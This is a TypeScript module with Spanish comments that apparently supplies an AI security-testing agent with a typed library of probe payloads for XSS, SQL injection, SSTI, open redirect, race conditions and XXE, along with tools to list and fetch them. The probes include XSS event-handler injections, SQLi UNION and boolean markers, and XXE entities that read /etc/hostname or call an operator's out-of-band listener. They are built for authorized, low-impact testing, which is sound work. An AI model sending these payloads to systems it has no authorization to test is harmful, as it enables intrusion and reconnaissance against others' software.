// Payloads nativos por clase de falla: tipados, con inocuidad declarada. La librería entrega
// variación y estructura (payload_list / payload_get); ninguna se envía sola: el modelo las manda
// con http_replay o las sondas, como siempre, y registra con evidencia. Cada set usado por
// sesión queda como artefacto, para reproducibilidad y para medir hit rate en el banco.
import type { Tool, ToolResult } from "./agent.ts";
import type { Artifacts } from "./artifacts.ts";
import type { ProfileGrants } from "./perfil.ts";

export interface Payload {
  id: string;
  /** Clase de falla: xss, sqli, ssti, redirect, race, xxe. */
  clase: string;
  /** Dónde entra: query, cuerpo, path, cookie, cabecera. */
  plantilla: string;
  /** Qué variante de la familia prueba. */
  variante: string;
  /** Por qué es inofensivo. Cada clase lo declara a su manera. */
  inocuidad: string;
  /** Marcas que el modelo busca en la respuesta para confirmar. */
  canario?: string;
  /** Clave extra por familia (motor de plantilla, contexto de reflejo…). */
  meta?: Record<string, string>;
}

export const PAYLOAD_CLASSES = ["xss", "sqli", "ssti", "redirect", "race", "xxe"] as const;

// ---------- XXE: lectura in-band de un archivo inocuo y, con oyente, una visita al oyente del operador ----------

/** Archivo que lee la entidad externa: el nombre del equipo; no trae datos de usuarios ni secretos. */
export const XXE_LOCAL_FILE = "/etc/hostname";
/** Lugar de la URL del oyente en las plantillas: lo completa la sonda que abre el oyente (upload_probe). */
export const XXE_LISTENER_SLOT = "{oyente}";

/**
 * DOCTYPE con la entidad general «xxe» hacia /etc/hostname y, si hay oyente, una entidad de parámetro
 * que lo visita al leer el DTD (la respuesta del oyente es vacía: un DTD vacío). Nada escribe ni ejecuta.
 */
export function xxeDoctype(root: string, listenerUrl?: string): string {
  const oob = listenerUrl ? `\n  <!ENTITY % oob SYSTEM "${listenerUrl.replace(/"/g, "%22")}">\n  %oob;` : "";
  return `<!DOCTYPE ${root} [\n  <!ENTITY xxe SYSTEM "file://${XXE_LOCAL_FILE}">${oob}\n]>`;
}

/** Texto que lleva la referencia a la entidad entre marcas propias: «marca[&xxe;]». */
export const xxeReference = (marker: string) => `${marker}[&xxe;]`;

/**
 * Si el texto trae la marca con la entidad resuelta («marca[contenido]» en vez de «marca[&xxe;]»),
 * devuelve el contenido leído (recortado). Escapada («&amp;xxe;») o intacta, no cuenta.
 */
export function xxeExpansion(text: string, marker: string): string | undefined {
  const at = text.indexOf(`${marker}[`);
  if (at < 0) return undefined;
  const start = at + marker.length + 1;
  const end = text.indexOf("]", start);
  if (end < 0) return undefined;
  const inner = text.slice(start, end).trim();
  if (!inner || /&(amp;)?xxe;/.test(inner)) return undefined;
  return inner.slice(0, 200);
}

/** Básico (bounty): visible siempre que el perfil no traiga extensivos. */
const BASE: Payload[] = [
  { id: "xss-html-1", clase: "xss", plantilla: "«orobas:x»", variante: "html directo", inocuidad: "texto inerte, sin etiquetas", canario: "orobas:x" },
  { id: "xss-attr-1", clase: "xss", plantilla: "\" autofocus onfocus=alert, var", variante: "escape de atributo entre comillas", inocuidad: "etiqueta inerte y atributo de foco", canario: "autofocus" },
  { id: "xss-attr-2", clase: "xss", plantilla: "'><b>orobas</b>", variante: "cierre de etiqueta", inocuidad: "elemento b sin atributos ni evento", canario: "<b>orobas</b>" },
  { id: "xss-comment-1", clase: "xss", plantilla: "--><i>orobas</i>", variante: "salir de comentario", inocuidad: "elemento i sin atributos", canario: "<i>orobas</i>" },
  { id: "xss-jsstr-1", clase: "xss", plantilla: "'-orobas-'", variante: "romper string JS", inocuidad: "guiones, no ejecuta nada", canario: "orobas" },
  { id: "sqli-err-1", clase: "sqli", plantilla: "'", variante: "comilla simple, error visible", inocuidad: "un carácter, rompe sintaxis a lo sumo", canario: "SQL" },
  { id: "sqli-err-2", clase: "sqli", plantilla: "\"\"", variante: "comillas dobles", inocuidad: "dos caracteres", canario: "SQL" },
  { id: "sqli-bool-1", clase: "sqli", plantilla: "1' AND '1'='1", variante: "booleano verdadero (control 1=1)", inocuidad: "comparación inofensiva", canario: "SQL" },
  { id: "sqli-bool-2", clase: "sqli", plantilla: "1' AND '1'='2", variante: "booleano falso (control 1=2)", inocuidad: "comparación inofensiva", canario: "SQL" },
  { id: "ssti-1", clase: "ssti", plantilla: "{{7*8}}", variante: "llaves dobles (Jinja/Twig-like)", inocuidad: "aritmética de un dígito, sin función", canario: "56", meta: { motor: "llaves dobles" } },
  { id: "ssti-2", clase: "ssti", plantilla: "${7*8}", variante: "dólar llaves (FreeMarker/JS-like)", inocuidad: "aritmética de un dígito", canario: "56", meta: { motor: "dólar llaves" } },
  { id: "ssti-3", clase: "ssti", plantilla: "<%= 7*8 %>", variante: "ERB", inocuidad: "aritmética de un dígito", canario: "56", meta: { motor: "ERB" } },
  { id: "ssti-4", clase: "ssti", plantilla: "#{7*8}", variante: "gato llaves (Ruby/EJS-like)", inocuidad: "aritmética de un dígito", canario: "56", meta: { motor: "gato llaves" } },
  { id: "redirect-1", clase: "redirect", plantilla: "https://externo.in/al", variante: "URL externa completa", inocuidad: "nunca se envía sola; sólo prueba el parámetro, no visita el destino", canario: "al" },
  { id: "redirect-2", clase: "redirect", plantilla: "//externo.in/al", variante: "relativa al protocolo", inocuidad: "sin esquema", canario: "externo" },
  { id: "redirect-3", clase: "redirect", plantilla: "https://local.site/\\/\\/externo.in/al", variante: "barras invertidas", inocuidad: "texto, no se visita solo", canario: "externo" },
  { id: "redirect-4", clase: "redirect", plantilla: "https://local.site/redirect?url=externo.in/al", variante: "cadena de redirecciones", inocuidad: "encadena rutas ya vistas", canario: "externo" },
  { id: "race-1", clase: "race", plantilla: "repeat:5 coupon", variante: "5 escrituras idénticas en paralelo (race_probe)", inocuidad: "misma escritura que una sola, repetida", canario: "paralelo" },
  { id: "xxe-local-1", clase: "xxe", plantilla: `<?xml version="1.0"?>\n${xxeDoctype("orobas")}\n<orobas>${xxeReference("orobas-xxe")}</orobas>`, variante: "entidad externa in-band hacia /etc/hostname", inocuidad: "lee el nombre del equipo (sin datos de usuarios); no escribe ni ejecuta", canario: "orobas-xxe[", meta: { nota: "Hay XXE si la respuesta trae «orobas-xxe[<nombre del equipo>]» en vez de «orobas-xxe[&xxe;]». Para archivos (SVG, DOCX, XLSX) usá upload_probe." } },
  { id: "xxe-oob-1", clase: "xxe", plantilla: `<?xml version="1.0"?>\n<!DOCTYPE orobas [\n  <!ENTITY % oob SYSTEM "${XXE_LISTENER_SLOT}">\n  %oob;\n]>\n<orobas>orobas</orobas>`, variante: "entidad de parámetro hacia el oyente del operador (fuera de banda)", inocuidad: "el servidor sólo pide una URL del oyente del operador, que responde vacío", canario: "visita al oyente", meta: { nota: "{oyente} lo completa upload_probe con el oyente del harness (lo declara el operador con CYBER_LISTENER_HOST); un oyente que nadie abrió no registra nada. Sin oyente declarado usá xxe-local-1." } },
];

/** Extensivo (pentest/laboratorio/defensa). */
const EXTENSIVE: Payload[] = [
  { id: "xss-svg-1", clase: "xss", plantilla: "<svg><animate onbegin=alert(1) attributeName=x></svg>", variante: "SVG animate", inocuidad: "etiqueta de animación sin efecto visible, evento de comienzo", canario: "animate" },
  { id: "xss-mutation-1", clase: "xss", plantilla: "<noscript><p title=\"</noscript><b>orobas</b>\">", variante: "mutation XSS por noscript", inocuidad: "sólo elementos de texto", canario: "orobas" },
  { id: "xss-mayus-1", clase: "xss", plantilla: "<SVG/ONLOAD=1>", variante: "mayúsculas y barra", inocuidad: "etiqueta inerte", canario: "ONLOAD" },
  { id: "xss-attrs-2", clase: "xss", plantilla: "x onpointerover=1 y", variante: "atributo de puntero (sin salida)", inocuidad: "número literal, no código", canario: "onpointerover" },
  { id: "xss-encode-1", clase: "xss", plantilla: "%3Cb%3Eorobas%3C/b%3E", variante: "URL-encode de html simple", inocuidad: "elemento b", canario: "orobas" },
  { id: "sqli-err-3", clase: "sqli", plantilla: "1)", variante: "paréntesis, agrupación rota", inocuidad: "rompe agrupación a lo sumo", canario: "SQL" },
  { id: "sqli-err-4", clase: "sqli", plantilla: "a'b'c", variante: "comillas intercaladas", inocuidad: "sólo comillas", canario: "SQL" },
  { id: "sqli-time-1", clase: "sqli", plantilla: "1' AND 1=1 -- AND 'a'='a", variante: "comment-terminated blind boolean (marcador)", inocuidad: "comentario de sintaxis, sin dormir", canario: "SQL", meta: { nota: "time-based (sleep) sólo si el operador lo autoriza: duerme ≤3 s por diseño" } },
  { id: "sqli-union-mark", clase: "sqli", plantilla: "1' UNION SELECT NULL --", variante: "marcador de columnas (NULL inofensivo)", inocuidad: "seleccionar NULL no lee nada", canario: "SQL", meta: { nota: "NULL de sondeo de columnas" } },
  { id: "redirect-at-1", clase: "redirect", plantilla: "https://local.site@externo.in/al", variante: "userinfo@", inocuidad: "texto, no se visita solo", canario: "externo" },
  { id: "redirect-back-1", clase: "redirect", plantilla: "https://local.site\\/@externo.in/al", variante: "barras invertidas + @ (bypass de backslash)", inocuidad: "texto, no se visita solo", canario: "externo" },
  { id: "redirect-encode-1", clase: "redirect", plantilla: "https:%2F%2Fexterno.in%2Fal", variante: "esquema URL-encoded", inocuidad: "texto, no se visita solo", canario: "externo" },
  { id: "race-2", clase: "race", plantilla: "repeat:10 coupon", variante: "10 escrituras idénticas en paralelo", inocuidad: "misma escritura repetida, no una escritura nueva", canario: "paralelo" },
  { id: "race-3", clase: "race", plantilla: "secuencia: pagar→aplicar→pagar", variante: "secuencia de pasos reordenable (saltear estado)", inocuidad: "pasos ya probados por separado", canario: "secuencia" },
  { id: "xxe-xinclude-1", clase: "xxe", plantilla: `<orobas xmlns:xi="http://www.w3.org/2001/XInclude">orobas-xi[<xi:include parse="text" href="file://${XXE_LOCAL_FILE}"/>]</orobas>`, variante: "XInclude (cuando sólo controlás un fragmento, sin DOCTYPE)", inocuidad: "lee el nombre del equipo; no escribe ni ejecuta", canario: "orobas-xi[" },
  { id: "xxe-svg-1", clase: "xxe", plantilla: `<?xml version="1.0"?>\n${xxeDoctype("svg")}\n<svg xmlns="http://www.w3.org/2000/svg" width="200" height="20"><text x="0" y="15">${xxeReference("orobas-xxe")}</text></svg>`, variante: "SVG con entidad externa (procesadores de imagen)", inocuidad: "lee el nombre del equipo; el SVG no tiene script", canario: "orobas-xxe[", meta: { nota: "Subilo con upload_probe (variante svg-xxe), que además mira cómo se sirve." } },
];

const ALL: Payload[] = [...BASE, ...EXTENSIVE];
const BY_CLASS = (clase: string) => ALL.filter((payload) => payload.clase === clase);
const findPayload = (id: string) => ALL.find((payload) => payload.id === id);

export function payloadSetFor(grants: ProfileGrants): Payload[] {
  return grants.payloadsExtensive ? ALL : [...BASE];
}

const str = (extra: object = {}) => ({ type: "string", ...extra });
const list = (items: object) => ({ type: "array", items });
const obj = (properties: Record<string, object>, required: string[]) => ({ type: "object", properties, required });
const finish = (text: string, details: Record<string, unknown> = {}): ToolResult => ({ text, details });

const payloadLine = (payload: Payload) => `${payload.id.padEnd(18)} ${payload.clase.padEnd(8)} ${payload.variante.slice(0, 42).padEnd(42)} inocuo: ${payload.inocuidad}`;

export interface PayloadContext {
  artifacts: Artifacts;
  grants: () => ProfileGrants;
}

export function createPayloadTools(context: PayloadContext): Tool[] {
  const { artifacts, grants } = context;

  const payloadList: Tool = {
    name: "payload_list",
    label: "Listar payloads por clase",
    description:
      "Devuelve los payloads disponibles por clase de falla (xss, sqli, ssti, redirect, race, xxe), cada uno con su variante y su inocuidad declarada. Nada se envía solo: elegís el id y lo mandás con http_replay o la sonda correspondiente, con control, y registrás candidato con evidencia. " +
      "El set usado queda como artefacto por sesión, para reproducibilidad. Con perfil «pentest», «laboratorio», «defensa» o «full-blast» hay variantes extensivas; con «bounty» sólo las básicas.",
    parameters: obj({ clase: str({ enum: [...PAYLOAD_CLASSES], description: "Clase de falla" }), variante: str({ description: "Filtro opcional de texto sobre la variante" }) }, ["clase"]),
    parallel: true,
    execute: async (params) => {
      const set = payloadSetFor(grants());
      const matches = set.filter((payload) => payload.clase === params.clase && (!params.variante || payload.variante.includes(params.variante)));
      if (!matches.length) return finish(`Sin payloads para «${params.clase}»${params.variante ? ` y «${params.variante}»` : ""} en este perfil (${grants().payloadsExtensive ? "extensivo" : "básico"}).`, { clase: params.clase });
      const artifact = artifacts.put(JSON.stringify({ clase: params.clase, perfil: grants().payloadsExtensive ? "extensivo" : "básico", payloads: matches }, null, 1), "application/json", "payload_list");
      return finish(`${matches.length} payloads para «${params.clase}» (perfil: ${grants().payloadsExtensive ? "extensivo" : "básico"}). Inocuidad de cada uno al lado; el envío siempre es tuyo, con control:\n${matches.map(payloadLine).join("\n")}\nSet de la sesión: ${artifact.hash}`, { clase: params.clase, total: matches.length, artefacto: artifact.hash });
    },
  };

  const payloadGet: Tool = {
    name: "payload_get",
    label: "Ver un payload por id",
    description: "Devuelve un payload completo (plantilla, variante, inocuidad, canario a buscar en la respuesta) para armar la petición con http_replay. Nada se envía solo.",
    parameters: obj({ id: str({ description: "Id del payload (ver payload_list)" }) }, ["id"]),
    parallel: true,
    execute: async (params) => {
      const payload = findPayload(params.id);
      if (!payload) throw new Error(`No hay payload «${params.id}». Lista con payload_list.`);
      const set = payloadSetFor(grants());
      if (!set.includes(payload)) throw new Error(`«${params.id}» es extensivo y el perfil actual no lo trae. El operador cambia el perfil con /perfil.`);
      return finish(`${payload.id} · ${payload.clase} · ${payload.variante}\nplantilla: ${payload.plantilla}\ninocuidad: ${payload.inocuidad}${payload.canario ? `\ncanario a buscar en la respuesta: ${payload.canario}` : ""}${payload.meta?.nota ? `\nnota: ${payload.meta.nota}` : ""}\nMandalo con http_replay (o la sonda de la clase) contra control y registrá candidato con evidencia si el canario aparece resuelto o distinto.`, { id: payload.id });
    },
  };

  return [payloadList, payloadGet];
}